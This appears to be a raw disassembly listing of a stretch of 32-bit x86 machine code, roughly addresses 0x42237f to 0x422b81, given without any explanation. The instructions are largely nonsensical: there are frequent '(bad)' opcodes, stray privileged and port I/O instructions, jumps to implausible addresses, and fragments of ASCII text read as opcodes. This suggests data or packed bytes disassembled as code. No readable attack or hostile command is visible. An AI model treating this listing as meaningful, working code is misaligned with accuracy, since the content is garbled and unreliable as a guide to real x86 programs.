  42237f:	jo     0x422305
  422381:	inc    esp
  422382:	xchg   ebx,eax
  422383:	rcr    BYTE PTR [edi+0x1e],cl
  422386:	lds    edi,FWORD PTR [ebp-0x3b]
  422389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42238a:	mov    al,0x7d
  42238c:	clc    
  42238d:	and    eax,0x9fd0a107
  422392:	inc    ebp
  422393:	add    BYTE PTR [eax],al
  422395:	add    BYTE PTR [edx],dh
  422397:	mov    bh,0x0
  422399:	add    BYTE PTR [ebx+0x9d],bh
  42239f:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4223a5:	mov    ecx,DWORD PTR [ebx-0x20dab275]
  4223ab:	dec    esp
  4223ac:	not    BYTE PTR [ecx]
  4223ae:	in     al,dx
  4223af:	test   ecx,0x8e60de32
  4223b5:	sub    edx,eax
  4223b7:	jl     0x422382
  4223b9:	mov    bh,0x6f
  4223bb:	retf   0x4448
  4223be:	xchg   esp,eax
  4223bf:	jmp    0xe92b0cac
  4223c4:	call   0xe92b0cb1
  4223c9:	mov    ecx,DWORD PTR [ebx+0x180810be]
  4223cf:	mov    ecx,DWORD PTR [ebx-0x5f6149e6]
  4223d5:	add    eax,0x71432911
  4223da:	jmp    0x4223f6
  4223dc:	rcl    BYTE PTR [eax-0x40],1
  4223df:	adc    BYTE PTR [ebp-0x551794d3],bl
  4223e5:	scas   al,BYTE PTR es:[edi]
  4223e6:	pusha  
  4223e7:	sti    
  4223e8:	dec    ecx
  4223e9:	add    al,0x5b
  4223eb:	dec    edi
  4223ec:	mov    ch,0xe2
  4223ee:	add    esp,edx
  4223f0:	mov    ds:0x8b094c38,eax
  4223f5:	mov    ebx,DWORD PTR [esi+ebx*1+0x53828b8b]
  4223fc:	push   0xffffff8b
  4223fe:	(bad)  
  4223ff:	(bad)  
  422400:	fld    QWORD PTR [eax]
  422402:	inc    esp
  422403:	hlt    
  422404:	cmp    ecx,DWORD PTR [ebx]
  422406:	mov    ch,0xab
  422408:	mov    fs,eax
  42240a:	and    BYTE PTR [eax-0x5e673d49],bl
  422410:	mov    bh,0x8b
  422412:	mov    al,ds:0xaecf74e7
  422417:	lea    ecx,[ebp+0x2b19438d]
  42241d:	adc    dh,al
  42241f:	cdq    
  422420:	cwde   
  422421:	fs clc 
  422423:	retf   0x7218
  422426:	sub    BYTE PTR [ecx+0x529daa22],0xa
  42242d:	leave  
  42242e:	nop
  42242f:	popf   
  422430:	(bad)  
  422431:	cmp    al,0xf4
  422433:	sub    cl,BYTE PTR ds:0x8d8d83ef
  422439:	push   ss
  42243a:	(bad)  
  42243b:	xlat   BYTE PTR ds:[ebx]
  42243c:	lea    ecx,[ebp+0x8d]
  422442:	add    BYTE PTR [eax],al
  422444:	add    BYTE PTR [eax],al
  422446:	add    BYTE PTR [eax],al
  422448:	bndldx bnd1,[esi]
	...
  422453:	add    BYTE PTR [ecx+0x12fa0d89],cl
  422459:	(bad)  
  42245a:	jge    0x4224ad
  42245c:	dec    ebx
  42245d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245e:	mov    edi,0xd844eb1b
  422463:	or     eax,edx
  422465:	rcr    cl,cl
  422467:	fstp   DWORD PTR cs:[ebx-0x56]
  42246b:	ret    0x9370
  42246e:	mov    DWORD PTR [ecx-0x767698ce],ecx
  422474:	or     DWORD PTR ds:0x5b368989,eax
  42247a:	push   cs
  42247b:	mov    WORD PTR [edx],ss
  42247d:	add    cl,BYTE PTR [ebp-0xfd89f5]
  422483:	daa    
  422484:	push   cs
  422485:	pushf  
  422486:	leave  
  422487:	jmp    DWORD PTR [edx+0xc]
  42248a:	test   eax,0xf6704151
  42248f:	(bad)  
  422490:	mov    DWORD PTR [eax],eax
  422492:	ficomp WORD PTR [ecx]
  422494:	cmp    edx,DWORD PTR [ebx+0x0]
  422497:	add    BYTE PTR [eax],al
  422499:	mov    ah,0x2b
  42249b:	mov    ebx,0x127373d5
  4224a0:	sub    DWORD PTR ss:[edx+0x2174c2a2],eax
  4224a7:	mov    ds:0x2e6520a6,eax
  4224ac:	data16 outs dx,BYTE PTR ds:[esi]
  4224ae:	imul   ebp,DWORD PTR [esi],0x2e792e79
  4224b4:	or     eax,0x20706e20
  4224b9:	gs gs ins BYTE PTR es:[edi],dx
  4224bc:	gs cs push edi
  4224bf:	jbe    0x42252a
  4224c1:	cs cs push 0x73746c69
  4224c8:	gs arpl WORD PTR gs:[edx+0x65],si
  4224cd:	jbe    0x422543
  4224cf:	jb     0x422544
  4224d1:	cmp    ah,BYTE PTR [edi+0x53]
  4224d4:	cmp    al,0x6c
  4224d6:	inc    esp
  4224d7:	outs   dx,DWORD PTR ds:[esi]
  4224d8:	push   eax
  4224d9:	and    BYTE PTR [esp+esi*2+0xa],dh
  4224dd:	jb     0x422544
  4224df:	popa   
  4224e0:	ins    DWORD PTR es:[edi],dx
  4224e1:	data16 ins BYTE PTR es:[edi],dx
  4224e3:	je     0x422505
  4224e5:	je     0x422523
  4224e7:	imul   ebp,DWORD PTR ds:[esi],0x6e617044
  4224ee:	inc    esp
  4224ef:	cmp    dl,BYTE PTR ds:[eax+0x44]
  4224f3:	and    BYTE PTR [ebx+0x74],dl
  4224f6:	inc    esp
  4224f7:	jbe    0x42256c
  4224f9:	push   ebx
  4224fa:	and    BYTE PTR [ebp+0x4e],ah
  4224fd:	jns    0x42249d
  4224ff:	fdiv   QWORD PTR [edx+edi*4-0x10]
  422503:	mov    ebp,0xf8feafd4
  422508:	in     al,0x69
  42250a:	sub    eax,0x2042e9a6
  42250f:	add    BYTE PTR [eax],al
  422511:	inc    ebx
  422512:	or     eax,0x0
	...
  42251f:	pop    edi
  422520:	icebp  
  422521:	test   esp,0xcccccccc
  422527:	int3   
  422528:	int3   
  422529:	int3   
  42252a:	int3   
  42252b:	push   eax
  42252c:	push   eax
  42252d:	jbe    0x42257a
  42252f:	arpl   WORD PTR [ecx],si
  422531:	cdq    
  422532:	stos   DWORD PTR es:[edi],eax
  422533:	in     eax,0x71
  422535:	pop    eax
  422536:	lods   eax,DWORD PTR ds:[esi]
  422537:	test   BYTE PTR [ebp+0x43],al
  42253a:	(bad)  
  42253b:	test   eax,0x81129909
  422540:	mov    dh,0xa
  422542:	inc    esp
  422543:	je     0x4224dd
  422545:	push   eax
  422546:	push   eax
  422547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422548:	push   ebx
  422549:	daa    
  42254a:	loopne 0x422502
  42254c:	cdq    
  42254d:	dec    edx
  42254e:	mov    esi,0x18b6e2e6
  422553:	xlat   BYTE PTR ds:[ebx]
  422554:	add    DWORD PTR [ebp-0x334970c7],edi
  42255a:	xor    eax,0x20c76f1b
  42255f:	push   cs
  422560:	in     al,0xc7
  422562:	mov    ebx,0xf8505071
  422567:	xchg   ebp,eax
  422568:	pop    edx
  422569:	push   eax
  42256a:	push   eax
  42256b:	inc    ecx
  42256c:	addr16 ret 
  42256e:	push   eax
  42256f:	jne    0x4225cd
  422571:	xchg   ebp,eax
  422572:	xor    al,0x91
  422574:	ret    
  422575:	sbb    eax,0x771a1aeb
  42257a:	scas   al,BYTE PTR es:[edi]
  42257b:	in     eax,dx
  42257c:	push   esp
  42257d:	shl    DWORD PTR [ebx],cl
  42257f:	(bad)  
  422580:	jne    0x42255c
  422582:	aad    0x81
  422584:	xchg   BYTE PTR [edi+ebx*2+0x7e],al
  422588:	jne    0x4225ff
  42258a:	jne    0x422548
  42258c:	pusha  
  42258d:	jne    0x422604
  42258f:	or     BYTE PTR [ebp+0x75],dh
  422592:	jne    0x422609
	...
  42259c:	add    BYTE PTR [ebx+0x9],ah
  42259f:	sub    cl,BYTE PTR [ebp-0x3b5589d6]
  4225a5:	sub    eax,0x1972644e
  4225aa:	ror    DWORD PTR [eax-0x30],cl
  4225ad:	clc    
  4225ae:	rcl    DWORD PTR [edi+0x37c593c6],1
  4225b4:	daa    
  4225b5:	int3   
  4225b6:	int3   
  4225b7:	int3   
  4225b8:	int3   
  4225b9:	int3   
  4225ba:	int3   
  4225bb:	int3   
  4225bc:	int3   
  4225bd:	int3   
  4225be:	add    BYTE PTR [eax],al
  4225c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225c1:	(bad)  
  4225c2:	jle    0x42260f
  4225c4:	add    BYTE PTR [eax],al
  4225c6:	pop    esp
  4225c7:	rcl    DWORD PTR [ecx],cl
  4225c9:	test   eax,0x3056c668
  4225ce:	pop    ecx
  4225cf:	or     BYTE PTR [esp+ebx*8],ah
  4225d2:	lea    edx,[eax]
  4225d4:	(bad)  
  4225d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d6:	mov    dl,dl
  4225d8:	scas   al,BYTE PTR es:[edi]
  4225d9:	shr    BYTE PTR [ebp-0x7c],0x4d
  4225dd:	pop    ds
  4225de:	mov    ebp,0xc8d61f1c
  4225e3:	push   0xffffffdb
  4225e5:	jo     0x42261e
  4225e7:	jns    0x4225e2
  4225e9:	add    BYTE PTR [eax],al
  4225eb:	loopne 0x42265f
  4225ed:	add    BYTE PTR [eax],al
  4225ef:	pop    ebp
  4225f0:	cmp    DWORD PTR [edi+0x0],esp
  4225f3:	add    BYTE PTR [edi+0xd],dh
  4225f6:	popf   
  4225f7:	and    eax,0x4d167d47
  4225fc:	mov    al,ds:0xf70ebb9e
  422601:	push   ebx
  422602:	xor    BYTE PTR [esp+ebx*1-0x255fe970],ch
  422609:	push   ss
  42260a:	and    DWORD PTR [eax+0x0],ebp
  42260d:	add    BYTE PTR [eax],al
  42260f:	int    0x55
  422611:	fdiv   QWORD PTR [edx-0x2e]
  422614:	pop    ebx
  422615:	inc    ecx
  422616:	dec    edi
  422617:	sbb    BYTE PTR [eax],0xd
  42261a:	addr16 dec ebp
  42261c:	loop   0x422638
  42261e:	inc    esi
  42261f:	test   eax,0xdfdf2701
  422624:	cmp    edi,DWORD PTR [esi+0xd]
  422627:	xor    al,0x1d
  422629:	sti    
  42262a:	inc    edi
  42262b:	mov    BYTE PTR [eax],0x0
  42262e:	cmp    eax,0xb536
	...
  42263b:	add    BYTE PTR [eax],al
  42263d:	das    
  42263e:	push   ebx
  42263f:	sub    DWORD PTR [eax],eax
	...
  422649:	lea    ecx,[ebp-0x60622c7a]
  42264f:	or     BYTE PTR [ecx+0x3d0b07a0],dh
  422655:	rcr    DWORD PTR [ebp+0x42711593],cl
  42265b:	cld    
  42265c:	icebp  
  42265d:	cmp    eax,0x368933a4
  422662:	jmp    0x8d8d:0x368c8d8d
  422669:	loopne 0x4226a3
  42266b:	lea    ecx,[ebp+0x76906719]
  422671:	push   ss
  422672:	xor    edi,ecx
  422674:	mov    BYTE PTR [esi-0x1db68bc8],cl
  42267a:	fs (bad) 
  42267d:	add    cl,BYTE PTR [ebp+0x2a]
  422680:	pushf  
  422681:	popa   
  422682:	and    edx,ecx
  422684:	fisttp DWORD PTR [ebp-0x341dc78c]
  42268a:	mov    bh,0x74
  42268c:	je     0x422702
  42268e:	jecxz  0x4226b9
  422690:	cmp    ecx,DWORD PTR [ecx]
  422692:	jl     0xd73402e6
  422698:	pop    ebx
  422699:	jns    0x422678
  42269b:	mov    ecx,0xf79bcb7a
  4226a0:	cmovb  ecx,ecx
  4226a3:	push   edx
  4226a4:	fcom   QWORD PTR [ebp-0x42bbd51]
  4226aa:	repnz retf 0x44c0
  4226ae:	xchg   esp,eax
  4226af:	out    dx,eax
  4226b0:	xor    BYTE PTR [esp+esi*2+0x8],0xa5
  4226b5:	je     0x42272b
  4226b7:	je     0x4226b9
	...
  4226c1:	inc    ebx
  4226c2:	iret   
  4226c3:	cmc    
  4226c4:	push   eax
  4226c5:	push   eax
  4226c6:	push   eax
  4226c7:	push   eax
  4226c8:	push   eax
  4226c9:	push   eax
  4226ca:	push   eax
  4226cb:	push   eax
  4226cc:	push   eax
  4226cd:	add    DWORD PTR [ebx-0x4c55721],0x18
  4226d4:	shl    BYTE PTR [ebx+0x49],1
  4226d7:	mov    ch,0x46
  4226d9:	call   0xe433:0xc0020b53
  4226e0:	mov    esp,0xbb192cab
  4226e5:	mov    ecx,0x20838374
  4226ea:	out    dx,al
  4226eb:	dec    ecx
  4226ec:	push   ebx
  4226ed:	int3   
  4226ee:	bound  ebp,QWORD PTR [eax+0x4d]
  4226f1:	(bad)  
  4226f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f3:	push   edx
  4226f4:	and    al,0xdb
  4226f6:	mov    ebp,0xc0ba6d45
  4226fb:	test   al,0x34
  4226fd:	mov    eax,ds:0x9613a6c9
  422702:	mov    ds,ebp
  422704:	pusha  
  422705:	out    dx,eax
  422706:	add    DWORD PTR [ebx-0x7c1e623d],0xffffff83
  42270d:	push   ss
  42270e:	and    ecx,DWORD PTR [ebx+eax*4+0x79e21aff]
  422715:	scas   eax,DWORD PTR es:[edi]
  422716:	add    DWORD PTR [ebx+0x2c21fdc5],ebp
  42271c:	push   edx
  42271d:	xor    ch,BYTE PTR [esi-0x22c803ae]
  422723:	sbb    edx,DWORD PTR [ebp-0x76]
  422726:	lahf   
  422727:	adc    eax,0xffff532e
  42272c:	call   FWORD PTR [ecx+edi*2-0x1]
  422730:	call   DWORD PTR [eax]
  422732:	ret    
  422733:	(bad)  
  422734:	(bad)  
  422735:	push   DWORD PTR [esp+esi*2+0x74]
  422739:	je     0x4227af
  42273b:	je     0x4227b1
  42273d:	je     0x4227b3
  42273f:	cmp    DWORD PTR [eax],ebx
  422741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422742:	xchg   esp,eax
  422743:	sti    
  422744:	mov    dh,0x83
  422746:	cld    
  422747:	je     0x4227a1
  422749:	mov    esi,0xe4db9030
  42274e:	adc    DWORD PTR [eax],0x4a405dee
  422754:	aam    0xf6
  422756:	js     0x422740
  422758:	call   0xe92b1045
  42275d:	call   0x20b49ad1
  422762:	imul   esp,DWORD PTR [ebp+0x41],0x6d206973
  422769:	cs cs gs je 0x4227d7
  42276e:	je     0x422790
  422770:	gs jbe 0x422795
  422773:	and    BYTE PTR [ebp+0x2e],ch
  422776:	ins    DWORD PTR es:[edi],dx
  422777:	imul   ebp,DWORD PTR gs:[ecx+0x20],0x65206d3d
  42277f:	push   edi
  422780:	cmp    dh,BYTE PTR [edi+0x73]
  422783:	push   edi
  422784:	ins    DWORD PTR es:[edi],dx
  422785:	push   ebx
  422786:	and    BYTE PTR [ecx+0xa],al
  422789:	dec    ebp
  42278a:	cs data16 jae 0x4227fc
  42278e:	sub    al,0x20
  422790:	outs   dx,DWORD PTR ds:[esi]
  422791:	jae    0x422805
  422793:	jne    0x4227d3
  422795:	arpl   WORD PTR [esi+0x73],bp
  422798:	das    
  422799:	outs   dx,DWORD PTR ds:[esi]
  42279a:	gs push ebx
  42279c:	cs jb  0x422811
  42279f:	outs   dx,BYTE PTR ds:[esi]
  4227a0:	ins    DWORD PTR es:[edi],dx
  4227a1:	jae    0x422816
  4227a3:	jns    0x422808
  4227a5:	and    BYTE PTR [edi+ebp*2+0x41],dh
  4227a9:	inc    ecx
  4227aa:	inc    edi
  4227ab:	and    BYTE PTR [edx+0x65],dh
  4227ae:	jo     0x42281d
  4227b0:	imul   edi,DWORD PTR [edx],0x73656d6d
  4227b6:	outs   dx,BYTE PTR ds:[esi]
  4227b7:	inc    esp
  4227b8:	and    BYTE PTR gs:[edx+0x20],ah
  4227bc:	outs   dx,DWORD PTR ds:[esi]
  4227bd:	outs   dx,BYTE PTR ds:[esi]
  4227be:	imul   ebp,DWORD PTR [eax],0x22702044
  4227c4:	jo     0x4227e6
  4227c6:	jb     0x42283c
  4227c8:	jb     0x422821
  4227ca:	jae    0x422840
  4227cc:	jbe    0x42283b
  4227ce:	jb     0x422843
  4227d0:	jb     0x4227f2
  4227d2:	arpl   WORD PTR gs:[ebp+0x20],si
  4227d6:	push   edi
  4227d7:	or     dh,BYTE PTR fs:[eax+0x63]
  4227db:	gs popa 
  4227dd:	gs outs dx,DWORD PTR gs:[esi]
  4227e0:	and    BYTE PTR [ecx-0x18],ch
  4227e3:	call   0x93b910d0
  4227e8:	loope  0x422830
  4227ea:	call   0xabd6f0d7
  4227ef:	cmp    ebp,eax
  4227f1:	and    eax,0xbbcd1614
  4227f6:	lds    edx,FWORD PTR [ebp+0x478cb43c]
  4227fc:	jbe    0x422864
  4227fe:	retf   0x92ec
  422801:	cmp    ebp,DWORD PTR [ebx]
  422803:	fld    DWORD PTR [esi-0x5]
  422806:	jp     0x422816
  422808:	pop    ds
  422809:	inc    esi
  42280a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42280c:	pop    edi
  42280d:	sbb    al,0x29
  42280f:	call   0xe909a1fc
  422814:	call   0xe897147d
  422819:	add    BYTE PTR [ebp+0x398f1bf3],al
  42281f:	pop    ds
  422820:	push   eax
  422821:	std    
  422822:	mov    edx,0x98e3846e
  422827:	xchg   ecx,eax
  422828:	or     al,0x65
  42282a:	lods   al,BYTE PTR ds:[esi]
  42282b:	fsubp  st(3),st
  42282d:	jns    0x422841
  42282f:	js     0x4227bf
  422831:	and    al,0x0
  422833:	add    BYTE PTR [eax],al
  422835:	inc    esp
  422836:	cmc    
  422837:	jnp    0x422869
  422839:	movnti DWORD PTR [esi],edi
  42283c:	jo     0x42282e
  42283e:	imul   edx,DWORD PTR [ecx-0x5e],0xffffff88
  422842:	mov    bl,0x87
  422844:	fstp   QWORD PTR [edi]
  422846:	cwde   
  422847:	dec    ebx
  422848:	rcl    DWORD PTR [edi],cl
  42284a:	jecxz  0x42287c
  42284c:	and    dl,dl
  42284e:	mov    esp,0xfd68dc
  422853:	add    bl,cl
  422855:	push   edi
  422856:	ins    BYTE PTR es:[edi],dx
  422857:	add    BYTE PTR [eax],al
  422859:	add    BYTE PTR [esp+esi*2+0x74],dh
  42285d:	je     0x4228d3
  42285f:	je     0x4228d5
  422861:	je     0x4228d7
  422863:	jb     0x4227fc
  422865:	cwde   
  422866:	(bad)  
  422867:	(bad)  
  422868:	(bad)  
  422869:	(bad)  
  42286a:	(bad)  
  42286b:	(bad)  
  42286c:	(bad)  
  42286d:	(bad)  
  42286e:	inc    DWORD PTR [eax]
  422870:	add    ah,bl
  422872:	shl    BYTE PTR [edi-0xb],1
  422875:	add    DWORD PTR [ecx+0x9],edx
  422878:	gs dec edx
  42287a:	mov    edi,esp
  42287c:	enter  0x1689,0xc1
  422880:	push   edi
  422881:	in     al,0x22
  422883:	push   ds
  422884:	scas   eax,DWORD PTR es:[edi]
  422885:	rol    BYTE PTR [edx+0x514c],cl
  42288b:	sub    al,0x5e
  42288d:	add    BYTE PTR [eax],al
  42288f:	jb     0x4228a0
  422891:	add    BYTE PTR [eax],al
  422893:	mov    ds:0x1e7be366,eax
  422898:	sub    edi,DWORD PTR [ecx+0x23]
  42289b:	aad    0x5f
  42289d:	jle    0x4228aa
  42289f:	imul   DWORD PTR [ecx+0x5cb52903]
  4228a5:	mov    ah,0xdc
  4228a7:	js     0x4228e7
  4228a9:	ret    
  4228aa:	mov    al,ds:0x765de800
  4228af:	cmp    BYTE PTR [ebx-0x18],ch
  4228b2:	call   0xe1ca279f
  4228b7:	lods   al,BYTE PTR ds:[esi]
  4228b8:	out    dx,eax
  4228b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228ba:	outs   dx,BYTE PTR ds:[esi]
  4228bb:	or     BYTE PTR [ebx+ebp*1-0x20],cl
  4228bf:	(bad)  
  4228c0:	std    
  4228c1:	mov    dh,0x2c
  4228c3:	xor    al,0x73
  4228c5:	pop    ds
  4228c6:	add    eax,0x103b8999
  4228cb:	lahf   
  4228cc:	xchg   edi,eax
  4228cd:	push   0xfffffff9
  4228cf:	push   edi
  4228d0:	js     0x42288e
  4228d2:	jg     0x4228f1
  4228d4:	xchg   esi,eax
  4228d5:	nop
  4228d6:	pop    eax
  4228d7:	call   0xe8e289c4
  4228dc:	call   0x8bcdb4c9
  4228e1:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4228e7:	pop    ds
  4228e8:	pop    ds
  4228e9:	popf   
  4228ea:	int3   
  4228eb:	int3   
  4228ec:	int3   
  4228ed:	int3   
  4228ee:	int3   
  4228ef:	int3   
  4228f0:	int3   
  4228f1:	int3   
  4228f2:	int3   
  4228f3:	mov    ecx,DWORD PTR [ebx+0x1b947248]
  4228f9:	push   esi
  4228fa:	push   ecx
  4228fb:	adc    bl,BYTE PTR [edx+0x24ba3a8f]
  422901:	push   es
  422902:	out    0xd5,eax
  422904:	dec    eax
  422905:	inc    DWORD PTR [edx-0x772017b6]
  42290b:	add    dh,BYTE PTR [eax-0x75]
  42290e:	mov    esi,DWORD PTR [ecx+0x3acfc2fb]
  422914:	mov    esi,0xa27d1116
  422919:	ss out 0xe8,eax
  42291c:	lahf   
  42291d:	cmp    BYTE PTR [edi-0x2079a501],al
  422923:	inc    esp
  422924:	ss sahf 
  422926:	mov    ah,0x4f
  422928:	xor    al,BYTE PTR [edx+esi*2+0x4e]
  42292c:	mov    ecx,DWORD PTR [ebx-0x742f0dcb]
  422932:	mov    ebx,DWORD PTR [edx]
  422934:	scas   eax,DWORD PTR es:[edi]
  422935:	dec    ebp
  422936:	mov    ecx,esp
  422938:	mov    edi,edi
  42293a:	push   ecx
  42293b:	inc    ecx
  42293c:	jp     0x4229b6
  42293e:	cmp    al,0x9a
  422940:	jle    0x422942
  422942:	out    0x9f,eax
  422944:	mov    esi,0xe724a7d0
  422949:	jne    0x42299e
  42294b:	jmp    0xe53f27b0
  422950:	int3   
  422951:	int3   
  422952:	int3   
  422953:	fsubr  QWORD PTR [ecx+0x1373cccc]
  422959:	int3   
  42295a:	int3   
  42295b:	int3   
	...
  422964:	add    ch,al
  422966:	sub    bh,BYTE PTR [eax+esi*8]
  422969:	inc    ecx
  42296a:	aas    
  42296b:	push   ds
  42296c:	pop    ds
  42296d:	add    eax,0xf3d392e0
  422972:	push   eax
  422973:	and    esi,eax
  422975:	inc    esp
  422976:	push   eax
  422977:	daa    
  422978:	popa   
  422979:	ins    BYTE PTR es:[edi],dx
  42297a:	mov    dh,0x4c
  42297c:	push   0xcccccccc
  422981:	int3   
  422982:	int3   
  422983:	int3   
  422984:	int3   
  422985:	int3   
  422986:	add    BYTE PTR [eax],al
  422988:	sub    eax,0x8aa63b
  42298d:	add    ah,al
  42298f:	adc    eax,0x7ba3712a
  422994:	gs popa 
  422996:	jnp    0x42297f
  422998:	fidiv  WORD PTR [ebx-0x31db9969]
  42299e:	lahf   
  42299f:	or     edx,ebp
  4229a1:	jnp    0x4229c0
  4229a3:	inc    ebp
  4229a4:	repz mov al,cs:0x5c991ca7
  4229ab:	lds    edi,FWORD PTR [ebp+0x5a]
  4229ae:	sbb    BYTE PTR [edx+0x41000078],ah
  4229b4:	dec    ecx
  4229b5:	add    BYTE PTR [eax],al
  4229b7:	pop    ecx
  4229b8:	push   ecx
  4229b9:	jb     0x4229bb
  4229bb:	test   DWORD PTR [esi+0x3c],ebp
  4229be:	cbw    
  4229c0:	sbb    BYTE PTR [ecx],dl
  4229c2:	or     edx,ecx
  4229c4:	jo     0x4229bd
  4229c6:	sub    eax,0xb9b9cd6e
  4229cb:	nop
  4229cc:	sbb    ecx,DWORD PTR ds:0xe6c9704a
  4229d2:	shl    DWORD PTR [ebp+eax*4-0x7b],1
  4229d6:	test   edx,ecx
  4229d8:	sub    BYTE PTR [esi],ch
  4229da:	pusha  
  4229db:	in     al,dx
  4229dc:	stos   DWORD PTR es:[edi],eax
  4229dd:	mov    ds:0x7ad1e1d0,al
  4229e2:	loope  0x422a02
  4229e4:	test   BYTE PTR [ecx],cl
  4229e6:	repz or edi,eax
  4229e9:	push   ss
  4229ea:	sub    al,0x69
  4229ec:	sub    eax,0x10140013
  4229f1:	rol    BYTE PTR [ecx-0x637a7a89],cl
  4229f7:	data16 hlt 
  4229f9:	test   DWORD PTR [ebp+0x74747485],eax
  4229ff:	je     0x422a75
  422a01:	je     0x422a77
  422a03:	je     0x422a79
  422a05:	call   0x42f604
	...
  422a12:	add    BYTE PTR [edi+0x4],dl
  422a15:	scas   eax,DWORD PTR es:[di]
  422a17:	inc    esi
  422a18:	add    ch,BYTE PTR [eax]
  422a1a:	inc    eax
  422a1b:	outs   dx,BYTE PTR ds:[esi]
  422a1c:	pop    edx
  422a1d:	xchg   ebp,eax
  422a1e:	or     esi,DWORD PTR [ecx+edi*1]
  422a21:	ror    DWORD PTR [ebp+0x76c97a16],0xc1
  422a28:	pop    edx
  422a29:	mov    bl,0x91
  422a2b:	add    BYTE PTR [eax],al
  422a2d:	mov    edi,0xb70000bb
  422a32:	sub    al,BYTE PTR [eax]
  422a34:	add    bl,bl
  422a36:	inc    ecx
  422a37:	inc    esi
  422a38:	test   BYTE PTR ds:0xe250071e,0xe1
  422a3f:	mov    edi,0xc24937a5
  422a44:	dec    edi
  422a45:	pop    esi
  422a46:	rcl    DWORD PTR [ebx+0x48],0x8d
  422a4a:	sub    ebx,DWORD PTR [eax+ebp*1-0x5a098b00]
  422a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a52:	icebp  
  422a53:	jne    0x422aca
  422a55:	jne    0x422a3a
  422a57:	retf   0x6be8
  422a5a:	test   al,0x46
  422a5c:	fcom   DWORD PTR [edi]
  422a5e:	movhps QWORD PTR [ecx-0x4d],xmm4
  422a62:	je     0x422ab7
  422a64:	aas    
  422a65:	mov    ?,WORD PTR [bx]
  422a68:	add    dh,BYTE PTR [ebp+0x179967ef]
  422a6e:	clc    
  422a6f:	fidivr DWORD PTR [edx]
  422a71:	fisub  DWORD PTR [ebp-0x6f33650d]
  422a77:	sbb    eax,0x14757582
  422a7c:	dec    edx
  422a7d:	jne    0x422af4
  422a7f:	jne    0x422ab4
  422a81:	xor    esi,DWORD PTR [ebx]
  422a83:	xor    esi,DWORD PTR [ebx]
  422a85:	xor    esi,DWORD PTR [ebx]
  422a87:	xor    esi,DWORD PTR [ebx]
  422a89:	leave  
  422a8a:	jnp    0x422a2d
  422a8c:	add    al,0x4
  422a8e:	add    al,0x4
  422a90:	add    al,0x4
  422a92:	add    al,0x4
  422a94:	add    al,0xff
  422a96:	inc    DWORD PTR [edi-0x4a]
  422a99:	repz push cs
  422a9b:	lahf   
  422a9c:	xor    BYTE PTR fs:[edx],ch
  422a9f:	xchg   edx,eax
  422aa0:	leave  
  422aa1:	pop    edx
  422aa3:	rol    DWORD PTR [edi],0x42
  422aa6:	or     esp,DWORD PTR [edi]
  422aa8:	mov    ebx,0xd83d5284
  422aad:	jo     0x422a7a
  422aaf:	(bad)  
  422ab0:	call   DWORD PTR [esi]
  422ab2:	dec    eax
  422ab3:	cmp    al,BYTE PTR [ebx+ecx*8+0x2e]
  422ab7:	and    dh,BYTE PTR [eax+0x7c8ab71f]
  422abd:	sbb    eax,0x1f3a7a67
  422ac2:	neg    BYTE PTR [edi]
  422ac4:	xor    bh,BYTE PTR [esi-0x4b9e1614]
  422aca:	aaa    
  422acb:	push   cs
  422acc:	lock cs (bad) 
  422acf:	inc    DWORD PTR ds:0xffffcae8
  422ad5:	mov    dh,0x41
  422ad7:	sbb    edi,edi
  422ad9:	dec    ebp
  422adb:	jmp    0x422b04
  422add:	inc    ebp
  422ade:	mov    bh,0x70
  422ae0:	pop    ecx
  422ae1:	xchg   edi,eax
  422ae2:	aad    0x2e
  422ae4:	sub    DWORD PTR [eax],eax
  422ae6:	mov    ebx,DWORD PTR [edx+0x6a]
  422ae9:	xor    cl,ah
  422aeb:	jg     0x422b54
  422aed:	test   DWORD PTR [ecx],edx
  422aef:	push   ebx
  422af0:	or     DWORD PTR [esi],ebx
  422af2:	(bad)  
  422af3:	(bad)  
  422af4:	jmp    FWORD PTR [edi+0x18]
  422af7:	(bad)  
  422af8:	(bad)  
  422af9:	inc    DWORD PTR [eax]
  422afb:	(bad)  
  422afc:	(bad)  
  422afd:	inc    DWORD PTR [eax]
	...
  422b07:	ror    BYTE PTR [esi+0x2e],cl
  422b0a:	jp     0x422b5e
  422b0c:	push   edi
  422b0d:	jmp    0x270:0xe2588273
  422b14:	loopne 0x422a97
  422b16:	scas   al,BYTE PTR es:[edi]
  422b17:	in     eax,dx
  422b18:	jb     0x422ac0
  422b1a:	stos   BYTE PTR es:[edi],al
  422b1b:	add    eax,0xbc3862
	...
  422b28:	add    DWORD PTR [ebx+0x468a5f63],0xffffff83
  422b2f:	and    DWORD PTR [ebx-0x86d6335],0x64
  422b36:	shl    DWORD PTR ds:0x3edba02,1
  422b3c:	add    al,0xe6
  422b3e:	sub    ebx,DWORD PTR [edi-0x4e]
  422b41:	mov    esp,0xb0fa88f9
  422b46:	jb     0x422b70
  422b48:	es xchg edi,eax
  422b4a:	rcr    dl,0xa0
  422b4d:	cld    
  422b4e:	push   ecx
  422b4f:	jl     0x422b6e
  422b51:	dec    esi
  422b52:	stc    
  422b53:	add    DWORD PTR [ebx-0x7c7c0dde],0x0
  422b5a:	xor    BYTE PTR [edi+0x76ed0483],al
  422b60:	fsub   QWORD PTR [eax+0x42]
  422b63:	jo     0x422ba5
  422b65:	dec    ebp
  422b66:	xchg   edx,esi
  422b68:	jne    0x422bd7
  422b6a:	dec    edi
  422b6b:	push   edi
  422b6c:	pop    ebp
  422b6d:	cmp    ah,BYTE PTR [eax-0x1962c935]
  422b73:	scas   eax,DWORD PTR es:[edi]
  422b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b75:	jge    0x422b7b
  422b77:	add    al,0x4
  422b79:	and    al,0xd5
  422b7b:	retf   0xacc
  422b7e:	fmul   QWORD PTR [esi-0x47]
  422b81:	xor    BYTE PTR [esi+0x64b0bf4d],ah
